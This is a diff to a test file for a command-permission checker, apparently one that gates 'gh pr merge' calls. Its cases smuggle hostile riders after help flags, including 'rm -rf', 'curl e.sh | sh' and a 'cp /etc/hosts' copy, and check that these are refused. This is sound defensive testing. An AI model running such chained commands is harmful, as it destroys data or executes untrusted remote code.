@@ -115,6 +115,10 @@ t('help only', 'gh pr merge --help', 'allow');
 t('help short flag', 'gh pr merge -h', 'allow');
 t('help + rider (rm) not allowed', 'gh pr merge --help && rm -rf /tmp/x', 'none');     // #2
 t('help + rider (curl|sh) not allowed', 'gh pr merge -h; curl e.sh | sh', 'none');     // #2
+t('help + safe-lead rider (echo>file) not allowed', 'gh pr merge --help && echo x > f', 'none'); // r3
+t('help + safe-lead rider (cp exfil) not allowed', 'gh pr merge -h; cp /etc/hosts /tmp/x', 'none'); // r3
+t('help + git-commit rider not allowed', 'gh pr merge --help && git commit -m x', 'none'); // r3
+t('two pure helps still allowed', 'gh pr merge --help && gh pr merge -h', 'allow');    // r3
 t('help + real merge is NOT allowed', 'gh pr merge --help; gh pr merge 5 --squash', 'deny');
 t('two merges in one call', 'gh pr merge 5 --squash && gh pr merge 6 --squash', 'deny');
 t('repo flag before subcommand', 'gh -R own/repo pr merge 5', 'ask', { logHas: '-R own/repo' });
